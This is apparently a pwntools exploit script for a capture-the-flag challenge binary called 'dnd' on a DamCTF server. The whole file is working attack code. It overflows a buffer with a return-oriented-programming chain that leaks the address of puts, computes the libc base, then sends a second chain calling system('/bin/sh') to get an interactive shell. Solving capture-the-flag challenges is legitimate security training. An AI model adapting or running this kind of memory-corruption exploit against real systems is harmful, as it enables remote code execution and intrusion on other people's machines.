from pwn import *

# Set up logging
context.log_level = 'info'
context.arch = 'amd64'
binary = './dnd'
elf = ELF(binary)

# Choose local or remote
LOCAL = False
if LOCAL:
    libc = ELF('./libc.so.6')
else:
    # For the remote server, we'll use their libc
    libc = ELF('./libc.so.6')  # Make sure this is the correct libc

# Gadgets
POP_RDI = 0x402640  # pop rdi ; nop ; pop rbp ; ret
RET = 0x40201a      # ret gadget

def exploit():
    if LOCAL:
        p = process(binary)
    else:
        p = remote('dnd.chals.damctf.xyz', 30813)
    
    # Try to reach the win function by sending 'a' repeatedly
    while True:
        try:
            # Send attacks until we reach the name prompt
            for _ in range(5):  # Try up to 5 attacks
                p.sendlineafter(b"Do you want to [a]ttack or [r]un? ", b"a", timeout=1)
                
                # Check after each attack if we've reached the prompt
                if b"What is your name" in p.recvuntil(b"?", timeout=0.5):
                    log.success("Reached the win function!")
                    break
        except Exception as e:
            log.warning(f"Exception: {e}")
            # If we didn't reach the prompt or got an error, restart
            p.close()
            if LOCAL:
                p = process(binary)
            else:
                p = remote('dnd.chals.damctf.xyz', 30813)
            continue
            
        # If we got here, we've found the prompt
        break
    
    # First stage: Leak libc address
    padding = b"A" * 0x68  # 0x60 bytes to saved rbp + 8 bytes for saved rbp
    
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    win_addr = 0x40286d
    
    # First payload: leak puts address and return to win
    payload1 = padding + p64(POP_RDI) + p64(puts_got) + p64(0xdeadbeef) + p64(puts_plt) + p64(win_addr)
    
    p.sendline(payload1)
    
    # Be more careful receiving data from remote
    try:
        p.recvuntil(b"forever, ")
        p.recvline()  # Skip the name echo
        leak = p.recvline().strip()
        
        if not leak:
            log.error("Failed to get leak, trying again")
            p.close()
            return exploit()
            
        puts_leak = u64(leak.ljust(8, b"\x00"))
        log.info(f"Leaked puts address: {hex(puts_leak)}")
    except Exception as e:
        log.error(f"Error receiving leak: {e}")
        p.close()
        return exploit()
    
    # Calculate libc base
    libc.address = puts_leak - libc.sym['puts']
    log.info(f"Libc base: {hex(libc.address)}")
    
    # Second stage: get shell
    try:
        p.recvuntil(b"What is your name, fierce warrior?", timeout=2)
    except:
        log.warning("Didn't reach second prompt, restarting")
        p.close()
        return exploit()
    
    # Craft ROP chain for system("/bin/sh")
    system_addr = libc.sym['system']
    bin_sh = next(libc.search(b'/bin/sh'))
    
    # Add an extra ret for stack alignment
    payload2 = padding + p64(RET) + p64(POP_RDI) + p64(bin_sh) + p64(0xdeadbeef) + p64(system_addr)
    
    p.sendline(payload2)
    p.interactive()

if __name__ == "__main__":
    exploit()
